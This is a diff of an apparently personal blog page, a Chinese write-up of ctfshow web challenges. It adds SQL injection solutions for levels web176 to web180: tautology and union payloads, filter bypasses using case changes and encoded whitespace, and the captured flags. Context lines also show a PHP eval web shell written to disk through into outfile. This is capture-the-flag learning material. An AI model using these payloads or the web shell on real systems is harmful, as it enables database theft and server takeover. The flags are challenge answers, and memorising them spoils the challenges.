@@ -25,7 +25,7 @@
 <meta property="og:description" content="ctfshow-web-wp ctfshow web入门篇（部分）  一、命令执行  1.web29 1234567891011121314151617181920212223&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Las">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-07-21T02:01:34.000Z">
-<meta property="article:modified_time" content="2026-07-22T03:14:40.184Z">
+<meta property="article:modified_time" content="2026-07-22T09:09:43.277Z">
 <meta property="article:author" content="Cl1ck-t0">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
@@ -156,7 +156,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-web-wp"><span class="toc-number">1.</span> <span class="toc-text"> ctfshow-web-wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web29"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.web29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web30"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.web30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web38"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 3.web38</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4web74"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 4.web74</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text"> 三、SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web171"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1.web171</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web172"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2.web172</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web173"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3.web173</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4web174"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 4.web174</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5web175"><span class="toc-number">1.3.5.</span> <span class="toc-text"> 5.web175</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-web-wp"><span class="toc-number">1.</span> <span class="toc-text"> ctfshow-web-wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web29"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.web29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web30"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.web30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web38"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 3.web38</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4web74"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 4.web74</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text"> 三、SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web171"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1.web171</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web172"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2.web172</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web173"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3.web173</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4web174"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 4.web174</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5web175"><span class="toc-number">1.3.5.</span> <span class="toc-text"> 5.web175</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6web176"><span class="toc-number">1.3.6.</span> <span class="toc-text"> 6.web176</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7web177"><span class="toc-number">1.3.7.</span> <span class="toc-text"> 7.web177</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8web178"><span class="toc-number">1.3.8.</span> <span class="toc-text"> 8.web178</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9web179"><span class="toc-number">1.3.9.</span> <span class="toc-text"> 9.web179</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10web180"><span class="toc-number">1.3.10.</span> <span class="toc-text"> 10.web180</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -276,7 +276,7 @@
 <p>得到flag：ctfshow{20ffb6cb-c965-4c66-8f6e-3c4ec71a6b84}</p>
 <h3 id="2web172"><a class="markdownIt-Anchor" href="#2web172"></a> 2.web172</h3>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
-<p>题目给了具体结构，不用再进行列行探测</p>
+<p>题目给了具体结构，不用再进行列行探测，子查询</p>
 <p>所以我们直接使用联合注入：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select password from ctfshow_user2 where username=&#x27;flag&#x27;)--+</span><br></pre></td></tr></table></figure>
 <p>得到flag：ctfshow{81156aaf-c4c1-4dad-a9d2-54039081fe76}</p>
@@ -314,6 +314,38 @@
 <p>然后直接访问文件即可。（还是太强了QAQ</p>
 <p>一句话木马这道题没有用，但是真好，写入，然后访问，然后还能用蚁剑或phpinfo查看环境变量(flag_no_here)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union select &#x27;&lt;?php eval($_POST[\&#x27;a\&#x27;]);?&gt;&#x27;,1  into outfile &#x27;/var/www/html/xqx.php&#x27;--+</span><br></pre></td></tr></table></figure>
+<h3 id="6web176"><a class="markdownIt-Anchor" href="#6web176"></a> 6.web176</h3>
+<p>过滤注入</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1 --+</span><br></pre></td></tr></table></figure>
+<p>万能注入</p>
+<p>flag：ctfshow{d06d0ed6-19c5-4411-b0a9-35ce8829e2df}</p>
+<p>后面发现这一题是过滤了select字段，使用大小写绕过sElect即可。</p>
+<h3 id="7web177"><a class="markdownIt-Anchor" href="#7web177"></a> 7.web177</h3>
+<p>这题不知道为什么用不了子查询语句？）</p>
+<p>过滤空格</p>
+<p>依旧万能注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or/**/1=1%23</span><br></pre></td></tr></table></figure>
+<p>当然也可以直接查询语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,2,password/**/from/**/ctfshow_user/**/where/**/username=&#x27;flag&#x27;%23</span><br></pre></td></tr></table></figure>
+<p>逗逗你的，还是可以子查询的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;%09union%09select%091,2,(select%09password%09from%09ctfshow_user%09where%09username%09=%09&#x27;flag&#x27;)%09%23</span><br></pre></td></tr></table></figure>
+<p>不过有点奇怪，/**/好像真不行？</p>
+<h3 id="8web178"><a class="markdownIt-Anchor" href="#8web178"></a> 8.web178</h3>
+<p>过滤了<code>*</code>，那么就需要用其它字符来绕过空格，可以选择</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%09 tab%0a%0b%0c%0d </span><br><span class="line">1&#x27;union%09select%0a1,2,password%0bfrom%0cctfshow_user%23</span><br></pre></td></tr></table></figure>
+<p>也可以依旧万能注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or%0a1=1%231’or&#x27;1&#x27;=&#x27;1&#x27;%23</span><br></pre></td></tr></table></figure>
+<p>ctfshow{8d5c9b0f-6fd3-41a6-ab07-854e6a22a060}</p>
+<h3 id="9web179"><a class="markdownIt-Anchor" href="#9web179"></a> 9.web179</h3>
+<p>依旧万能，过滤了<code>%09 %0a %0b %0d</code></p>
+<p>可以用<code>%0c</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or%0c1=1%231’or&#x27;1&#x27;=&#x27;1&#x27;%23</span><br></pre></td></tr></table></figure>
+<p>ctfshow{8645bd0f-3bc0-4d85-aedb-6ac2a440269e}</p>
+<h3 id="10web180"><a class="markdownIt-Anchor" href="#10web180"></a> 10.web180</h3>
+<p>比上一题多了个#过滤；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;%0cunion%0cselect%0c1,2,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername%0c=%0c&#x27;flag&#x27;)%0c--%0c</span><br></pre></td></tr></table></figure>
+<p>得到flag：ctfshow{c9bed3be-814c-42a1-9e1c-27545ff09f6d}</p>
 
     </div>
     <footer class="article-footer">
@@ -322,7 +354,7 @@
     <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/07/21/ctfshow-web-wp/">https://cl1ck-t0.github.io/2026/07/21/ctfshow-web-wp/</a></p>
     
     <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-07-21 10:01:34</p>
-    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-07-22 11:14:40</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-07-22 17:09:43</p>
     <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
     <span class="icon-creative-commons article-copyright-bg"></span>
   </blockquote>
@@ -364,7 +396,7 @@
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
     <div class="article-nav-link-wrap right">
-          <img data-src="/covers/evernight-honkai-3840x2160-24123.jpg" data-sizes="auto" alt="Web入门——爆破" class="lazyload">
+          <img data-src="/covers/51aed603166dff1de44b9bcf765c6677.jpg" data-sizes="auto" alt="Web入门——爆破" class="lazyload">
       <a href="/2026/07/20/Web%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E7%88%86%E7%A0%B4/" aria-label="Next: Web入门——爆破"  title="Next: Web入门——爆破"></a>
       <div class="article-nav-caption">Next</div>
       <h3 class="article-nav-title">
@@ -413,10 +445,10 @@
       </div>
       <div>
         <span class="icon-brush"></span>
-        40.2k
+        40.5k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        03:07
+        03:09
       </div>
       <div>
         <span class="icon-eye"></span>
@@ -438,7 +470,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-web-wp"><span class="toc-number">1.</span> <span class="toc-text"> ctfshow-web-wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web29"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.web29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web30"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.web30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web38"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 3.web38</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4web74"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 4.web74</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text"> 三、SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web171"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1.web171</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web172"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2.web172</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web173"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3.web173</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4web174"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 4.web174</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5web175"><span class="toc-number">1.3.5.</span> <span class="toc-text"> 5.web175</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-web-wp"><span class="toc-number">1.</span> <span class="toc-text"> ctfshow-web-wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web29"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.web29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web30"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.web30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web38"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 3.web38</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4web74"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 4.web74</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text"> 三、SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1web171"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1.web171</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2web172"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2.web172</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3web173"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3.web173</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4web174"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 4.web174</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5web175"><span class="toc-number">1.3.5.</span> <span class="toc-text"> 5.web175</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6web176"><span class="toc-number">1.3.6.</span> <span class="toc-text"> 6.web176</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7web177"><span class="toc-number">1.3.7.</span> <span class="toc-text"> 7.web177</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8web178"><span class="toc-number">1.3.8.</span> <span class="toc-text"> 8.web178</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9web179"><span class="toc-number">1.3.9.</span> <span class="toc-text"> 9.web179</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10web180"><span class="toc-number">1.3.10.</span> <span class="toc-text"> 10.web180</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -577,7 +609,7 @@
           description: "",
           stripContent: " ctfshow-web-wp ctfshow web入门篇（部分）  一、命令执行  1.web29 1234567891011121314151617181920212223&amp;lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:26:48# @email: h1xa",
           date: "Tue Jul 21 2026 10:01:34 GMT+0800",
-          updated: "Wed Jul 22 2026 11:14:40 GMT+0800",
+          updated: "Wed Jul 22 2026 17:09:43 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
